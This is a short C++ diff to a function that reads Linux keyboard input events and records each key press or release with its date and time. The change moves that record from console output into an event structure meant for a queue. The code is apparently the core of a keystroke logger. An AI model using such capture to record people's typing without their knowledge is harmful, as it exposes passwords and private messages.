@@ -206,11 +206,14 @@ auto logger::ev_reader() -> void {
 		n = read(fd_, &ev, sizeof(ev));
 		if (n == (ssize_t)sizeof(ev)) {
 			if (ev.type == EV_KEY) {
-				std::string key_name = get_keychar(ev.code);
-				dtg                  = datetime(ev.time.tv_sec);
-				std::cout
-				  << dtg.first << " " << dtg.second << " logger (ev): " << key_name << " (" << ev.code << ") "
-				  << (ev.value ? "pressed" : "released") << std::endl;
+				dtg = datetime(ev.time.tv_sec);
+				event e;
+				e.date  = dtg.first;
+				e.time  = dtg.second;
+				e.key   = get_keychar(ev.code);
+				e.press = ev.value ? "press" : "release";
+				e.mod   = false;
+				// TODO: send event e to tsq using dependency injection
 			}
 		}
 		else if (n == -1) {
